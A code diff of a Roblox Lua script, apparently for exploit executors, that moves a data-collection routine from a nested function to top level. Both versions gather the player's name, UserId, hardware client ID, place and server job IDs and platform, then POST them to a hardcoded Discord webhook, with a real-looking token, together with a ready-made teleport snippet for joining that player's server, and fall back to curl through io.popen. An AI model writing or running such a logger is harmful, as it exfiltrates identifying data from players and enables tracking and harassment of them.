@@ -1,189 +1,184 @@
-local function sendTeleportInfoAndPrepareScript()
-    local Players = game:GetService("Players")
-    local HttpService = game:GetService("HttpService")
-    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-    local TeleportService = game:GetService("TeleportService")
-    local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local TeleportService = game:GetService("TeleportService")
+local UserInputService = game:GetService("UserInputService")
 
-    -- Replace this with your webhook URL
-    local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"
+-- Replace this with your webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1251060163398467625/zLMibUZzFIdx_ZsAr-dBT1DFbp3K4w1Q0qFvrunDzlsiuEzbE-tlmqoync5eh_Qhjl9h"
 
-    -- Function to send information to Discord and prepare teleport script
-    local function sendTeleportInfo()
-        local localPlayer = Players.LocalPlayer
-        if not localPlayer then
-            return
-        end
-
-        local playerName = localPlayer.Name
-        local userId = localPlayer.UserId
-        local HWID = RbxAnalyticsService:GetClientId()
-        local placeId = game.PlaceId
-        local jobId = game.JobId
-
-        -- Determine the platform
-        local platform
-        if UserInputService.TouchEnabled then
-            platform = "Mobile"
-        elseif UserInputService.KeyboardEnabled then
-            platform = "PC"
-        elseif UserInputService.GamepadEnabled then
-            platform = "Console"
-        else
-            platform = "Unknown"
-        end
-
-        local requestMethod = "Unknown"
-        local response = nil
-
-        -- Determine which HTTP request method is available and use it
-        if syn and syn.request then
-            requestMethod = "syn"
-            response = syn.request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode({["content"] = "Test message"})
-            })
-        elseif http and http.request then
-            requestMethod = "http"
-            response = http.request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode({["content"] = "Test message"})
-            })
-        elseif request then
-            requestMethod = "request"
-            response = request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode({["content"] = "Test message"})
-            })
-        elseif http_request then
-            requestMethod = "http_request"
-            response = http_request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode({["content"] = "Test message"})
-            })
-        elseif solara and solara.request then
-            requestMethod = "solara"
-            response = solara.request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode({["content"] = "Test message"})
-            })
-        elseif curl then
-            requestMethod = "curl"
-            local jsonData = HttpService:JSONEncode({["content"] = "Test message"})
-            local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
-            local handle = io.popen(cmd)
-            local result = handle:read("*a")
-            handle:close()
-            response = {StatusCode = 200, StatusMessage = result}
-        else
-            return
-        end
-
-        -- Create payload to send to Discord
-        local data = {
-            ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nPlatform: " .. platform .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
-        }
-
-        -- Convert data to JSON format
-        local jsonData = HttpService:JSONEncode(data)
-
-        -- Send POST request to Discord webhook with the actual data
-        if syn and syn.request then
-            response = syn.request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = jsonData
-            })
-        elseif http and http.request then
-            response = http.request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = jsonData
-            })
-        elseif request then
-            response = request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = jsonData
-            })
-        elseif http_request then
-            response = http_request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = jsonData
-            })
-        elseif solara and solara.request then
-            response = solara.request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = jsonData
-            })
-        elseif curl then
-            local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
-            local handle = io.popen(cmd)
-            local result = handle:read("*a")
-            handle:close()
-            response = {StatusCode = 200, StatusMessage = result}
-        else
-            return
-        end
+-- Function to send information to Discord and prepare teleport script
+local function sendTeleportInfo()
+    local localPlayer = Players.LocalPlayer
+    if not localPlayer then
+        return
     end
 
-    -- Wait for local player to be available before sending information and teleporting
-    local function waitForLocalPlayer()
-        local localPlayer = Players.LocalPlayer
-        while not localPlayer do
-            Players.PlayerAdded:Wait()
-            localPlayer = Players.LocalPlayer
-        end
-        sendTeleportInfo()
-    end
+    local playerName = localPlayer.Name
+    local userId = localPlayer.UserId
+    local HWID = RbxAnalyticsService:GetClientId()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
 
-    -- If local player is already present (e.g., if script is run after player is added)
-    if Players.LocalPlayer then
-        sendTeleportInfo()
+    -- Determine the platform
+    local platform
+    if UserInputService.TouchEnabled then
+        platform = "Mobile"
+    elseif UserInputService.KeyboardEnabled then
+        platform = "PC"
+    elseif UserInputService.GamepadEnabled then
+        platform = "Console"
     else
-        waitForLocalPlayer()
+        platform = "Unknown"
+    end
+
+    local requestMethod = "Unknown"
+    local response = nil
+
+    -- Determine which HTTP request method is available and use it
+    if syn and syn.request then
+        requestMethod = "syn"
+        response = syn.request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({["content"] = "Test message"})
+        })
+    elseif http and http.request then
+        requestMethod = "http"
+        response = http.request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({["content"] = "Test message"})
+        })
+    elseif request then
+        requestMethod = "request"
+        response = request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({["content"] = "Test message"})
+        })
+    elseif http_request then
+        requestMethod = "http_request"
+        response = http_request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({["content"] = "Test message"})
+        })
+    elseif solara and solara.request then
+        requestMethod = "solara"
+        response = solara.request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({["content"] = "Test message"})
+        })
+    elseif curl then
+        requestMethod = "curl"
+        local jsonData = HttpService:JSONEncode({["content"] = "Test message"})
+        local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
+        local handle = io.popen(cmd)
+        local result = handle:read("*a")
+        handle:close()
+        response = {StatusCode = 200, StatusMessage = result}
+    else
+        return
+    end
+
+    -- Create payload to send to Discord
+    local data = {
+        ["content"] = "------------\nName of LocalPlayer: " .. playerName .. "\nUserId of LocalPlayer: " .. userId .. "\nHWID of LocalPlayer: " .. HWID .. "\nPlaceId: " .. placeId .. "\nJobId: " .. jobId .. "\nPlatform: " .. platform .. "\nHTTP Request Method: " .. requestMethod .. "\n\n```lua\nlocal TeleportService = game:GetService('TeleportService')\nlocal placeId = " .. placeId .. "\nlocal jobId = '" .. jobId .. "'\nlocal function teleportToServer()\n    local player = game.Players.LocalPlayer\n    if player then\n        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)\n    else\n        warn('LocalPlayer not found')\n    end\nend\nteleportToServer()\n```" .. "\n------------"
+    }
+
+    -- Convert data to JSON format
+    local jsonData = HttpService:JSONEncode(data)
+
+    -- Send POST request to Discord webhook with the actual data
+    if syn and syn.request then
+        response = syn.request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    elseif http and http.request then
+        response = http.request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    elseif request then
+        response = request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    elseif http_request then
+        response = http_request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    elseif solara and solara.request then
+        response = solara.request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    elseif curl then
+        local cmd = string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', jsonData, webhookUrl)
+        local handle = io.popen(cmd)
+        local result = handle:read("*a")
+        handle:close()
+        response = {StatusCode = 200, StatusMessage = result}
+    else
+        return
     end
 end
 
--- Invoke the function to send teleport information and prepare teleport script
-sendTeleportInfoAndPrepareScript()
+-- Function to wait for LocalPlayer to be available
+local function waitForLocalPlayer()
+    local localPlayer = Players.LocalPlayer
+    while not localPlayer do
+        wait(1)  -- Wait for 1 second before checking again
+        localPlayer = Players.LocalPlayer
+    end
+    sendTeleportInfo()
+end
+
+-- Check if LocalPlayer is already available
+if Players.LocalPlayer then
+    sendTeleportInfo()
+else
+    waitForLocalPlayer()
+end
 
 ____________________
 ____________________
